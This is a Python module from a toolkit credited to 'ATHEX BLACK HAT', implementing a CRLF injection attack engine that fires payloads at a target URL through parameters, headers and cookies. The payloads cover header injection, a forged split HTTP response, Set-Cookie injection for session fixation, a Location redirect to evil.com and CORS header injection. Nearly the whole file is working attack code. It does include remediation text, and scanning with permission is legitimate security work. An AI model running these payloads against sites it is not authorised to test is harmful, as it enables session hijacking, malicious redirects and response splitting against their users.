# modules/attacks/crlf_injection.py

"""
CRLF Injection Attack Engine
Author: ATHEX BLACK HAT
Team: Wolf Intelligence PK
Version: 1.0.0

Tests for CRLF injection vulnerabilities enabling
HTTP response splitting, header injection, and
session fixation attacks.
"""

from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field
from urllib.parse import quote

import requests
from requests.exceptions import RequestException


@dataclass
class CRLFResult:
    """Represents a CRLF injection test result."""
    url: str
    parameter: str
    payload: str
    encoded_payload: str
    injection_type: str
    response_headers: Dict[str, str]
    injected_header_found: bool
    response_splitting: bool
    vulnerability_found: bool
    description: str


class CRLFInjection:
    """
    CRLF injection attack engine.
    
    Tests for Carriage Return Line Feed injection
    vulnerabilities in HTTP headers and parameters.
    """
    
    CRLF_PAYLOADS = [
        '%0d%0a',
        '%0D%0A',
        '\r\n',
        '%0a',
        '%0A',
        '\n',
    ]
    
    INJECTION_PAYLOADS = {
        'header_injection': {
            'payload_template': '{crlf}X-Injected: true{crlf}',
            'detection': 'X-Injected',
        },
        'response_splitting': {
            'payload_template': '{crlf}HTTP/1.1 200 OK{crlf}Content-Type: text/html{crlf}{crlf}<html>Injected</html>',
            'detection': '<html>Injected</html>',
        },
        'cookie_injection': {
            'payload_template': '{crlf}Set-Cookie: injected=true; Path=/',
            'detection': 'injected=true',
        },
        'location_redirect': {
            'payload_template': '{crlf}Location: http://evil.com',
            'detection': 'evil.com',
        },
        'cors_header': {
            'payload_template': '{crlf}Access-Control-Allow-Origin: *',
            'detection': 'Access-Control-Allow-Origin',
        },
    }
    
    TARGET_PARAMETERS = [
        'redirect', 'url', 'return', 'next', 'goto',
        'returnUrl', 'redirectUrl', 'redirect_uri',
        'callback', 'target', 'r', 'redir',
    ]
    
    TARGET_HEADERS = [
        'Referer', 'User-Agent', 'X-Forwarded-For',
        'X-Forwarded-Host', 'Cookie', 'Accept-Language',
    ]
    
    def __init__(
        self,
        target: str,
        config: Optional[Dict[str, Any]] = None
    ):
        """
        Initialize the CRLF injection tester.
        
        Args:
            target: Target URL
            config: Configuration dictionary
        """
        self.target = target
        self.config = config or {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        
        self.timeout = self.config.get('timeout', 30)
        self.verify_ssl = self.config.get('verify_ssl', False)
        
        self.results: List[CRLFResult] = []
        self.errors: List[str] = []
    
    def test_parameter_injection(
        self,
        url: str,
        parameter: str
    ) -> List[CRLFResult]:
        """
        Test for CRLF injection in URL parameters.
        
        Args:
            url: Target URL
            parameter: Parameter to test
            
        Returns:
            List of CRLFResult objects
        """
        results = []
        
        for injection_name, injection_data in self.INJECTION_PAYLOADS.items():
            for crlf in self.CRLF_PAYLOADS:
                payload = injection_data['payload_template'].format(crlf=crlf)
                encoded_payload = quote(payload, safe='')
                
                test_url = f"{url}?{parameter}={encoded_payload}"
                
                try:
                    response = self.session.get(
                        test_url,
                        timeout=self.timeout,
                        verify=self.verify_ssl,
                        allow_redirects=False
                    )
                    
                    detection_string = injection_data['detection']
                    
                    injected_header_found = detection_string.lower() in response.text.lower()
                    
                    header_injection_detected = False
                    for header_name, header_value in response.headers.items():
                        if detection_string.lower() in str(header_value).lower():
                            header_injection_detected = True
                            break
                    
                    response_splitting = (
                        '<html>Injected</html>' in response.text and
                        injection_name == 'response_splitting'
                    )
                    
                    vulnerability_found = injected_header_found or header_injection_detected or response_splitting
                    
                    result = CRLFResult(
                        url=url,
                        parameter=parameter,
                        payload=payload,
                        encoded_payload=encoded_payload,
                        injection_type=injection_name,
                        response_headers=dict(response.headers),
                        injected_header_found=header_injection_detected,
                        response_splitting=response_splitting,
                        vulnerability_found=vulnerability_found,
                        description=f'CRLF {injection_name} via parameter {parameter}'
                    )
                    
                    results.append(result)
                    
                except RequestException as e:
                    self.errors.append(f"Parameter injection test failed: {str(e)}")
                    continue
        
        self.results.extend(results)
        return results
    
    def test_header_injection(
        self,
        url: str
    ) -> List[CRLFResult]:
        """
        Test for CRLF injection in HTTP headers.
        
        Args:
            url: Target URL
            
        Returns:
            List of CRLFResult objects
        """
        results = []
        
        for header_name in self.TARGET_HEADERS:
            for crlf in self.CRLF_PAYLOADS:
                injection_value = f"test{crlf}X-CRLF-Test: injected"
                
                headers = {header_name: injection_value}
                
                try:
                    response = self.session.get(
                        url,
                        headers=headers,
                        timeout=self.timeout,
                        verify=self.verify_ssl,
                        allow_redirects=False
                    )
                    
                    injected_header_found = 'X-CRLF-Test' in str(response.headers)
                    
                    vulnerability_found = injected_header_found
                    
                    result = CRLFResult(
                        url=url,
                        parameter=header_name,
                        payload=injection_value,
                        encoded_payload=injection_value,
                        injection_type='header_injection',
                        response_headers=dict(response.headers),
                        injected_header_found=injected_header_found,
                        response_splitting=False,
                        vulnerability_found=vulnerability_found,
                        description=f'CRLF injection via {header_name} header'
                    )
                    
                    results.append(result)
                    
                except RequestException as e:
                    self.errors.append(f"Header injection test failed: {str(e)}")
                    continue
        
        self.results.extend(results)
        return results
    
    def test_cookie_injection(
        self,
        url: str
    ) -> List[CRLFResult]:
        """
        Test for CRLF injection in cookies.
        
        Args:
            url: Target URL
            
        Returns:
            List of CRLFResult objects
        """
        results = []
        
        for crlf in self.CRLF_PAYLOADS:
            cookie_value = f"test{crlf}Set-Cookie: crlf_test=true"
            
            try:
                response = self.session.get(
                    url,
                    cookies={'test': cookie_value},
                    timeout=self.timeout,
                    verify=self.verify_ssl,
                    allow_redirects=False
                )
                
                injected_cookie = any(
                    'crlf_test' in cookie.name.lower()
                    for cookie in response.cookies
                )
                
                set_cookie_header = response.headers.get('Set-Cookie', '')
                injected_set_cookie = 'crlf_test' in set_cookie_header
                
                vulnerability_found = injected_cookie or injected_set_cookie
                
                result = CRLFResult(
                    url=url,
                    parameter='Cookie',
                    payload=cookie_value,
                    encoded_payload=cookie_value,
                    injection_type='cookie_injection',
                    response_headers=dict(response.headers),
                    injected_header_found=injected_set_cookie,
                    response_splitting=False,
                    vulnerability_found=vulnerability_found,
                    description=f'CRLF injection via Cookie header'
                )
                
                results.append(result)
                
            except RequestException as e:
                self.errors.append(f"Cookie injection test failed: {str(e)}")
                continue
        
        self.results.extend(results)
        return results
    
    def run(self) -> Dict[str, Any]:
        """
        Run all CRLF injection tests.
        
        Returns:
            Dictionary with test results
        """
        for parameter in self.TARGET_PARAMETERS:
            self.test_parameter_injection(self.target, parameter)
        
        self.test_header_injection(self.target)
        self.test_cookie_injection(self.target)
        
        findings = []
        for result in self.results:
            if result.vulnerability_found:
                findings.append({
                    'type': f'CRLF Injection: {result.injection_type}',
                    'severity': 'medium',
                    'endpoint': result.url,
                    'parameter': result.parameter,
                    'payload': result.payload,
                    'description': result.description,
                    'remediation': 'Sanitize and encode user input. '
                                   'Strip CR and LF characters from input. '
                                   'Use secure HTTP libraries that prevent header injection.',
                })
        
        return {
            'findings': findings,
            'errors': self.errors,
            'parameters_tested': len(self.TARGET_PARAMETERS),
            'headers_tested': len(self.TARGET_HEADERS),
            'total_tests': len(self.results),
            'vulnerabilities_found': len(findings),
        }